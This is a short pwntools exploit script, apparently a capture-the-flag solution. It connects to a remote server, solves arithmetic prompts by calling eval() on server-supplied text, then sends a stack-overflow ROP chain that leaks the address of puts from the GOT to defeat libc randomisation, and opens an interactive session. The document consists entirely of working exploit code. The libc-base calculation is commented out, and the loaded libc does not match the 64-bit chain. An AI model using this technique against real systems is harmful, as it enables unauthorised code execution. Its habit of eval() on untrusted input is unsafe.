from pwn import *
elf = ELF('./math1', checksec=False)
libc = ELF('./libc6-i386_2.19-0ubuntu6_amd64.so', checksec=False)
def math_goes_skraa():
    p.recvuntil(':)\n')
    res = p.recvuntil('=').decode().split(' ')
    print(res)
    answer = eval(res[0] + res[1] + res[2])
    p.sendline(b'%d' % answer)

    for i in range(99):
        res = p.recvuntil('=').decode().split(' ')
        #print(res)
        answer = eval(res[1] + res[2] + res[3])
        p.sendline(b'%d' % answer)

#p = elf.process()
p = remote('104.199.120.115', 17073)
math_goes_skraa()

payload = b''.join([
    cyclic(0x10c-4),
    p64(0x0000000000401016),
    p64(0x000000000040186b), # pop rdi
    p64(elf.got['puts']),
    p64(elf.plt['puts']),
    p64(elf.sym['_start'])
])
p.sendlineafter(b'>', payload)
leak = u64(p.recvline_contains(b'\x7f').strip().ljust(8, b'\x00'))
#libc.address = leak - libc.sym['printf']
log.info('leak 0x%x' % leak)
log.info('base 0x%x' % libc.address)

p.interactive()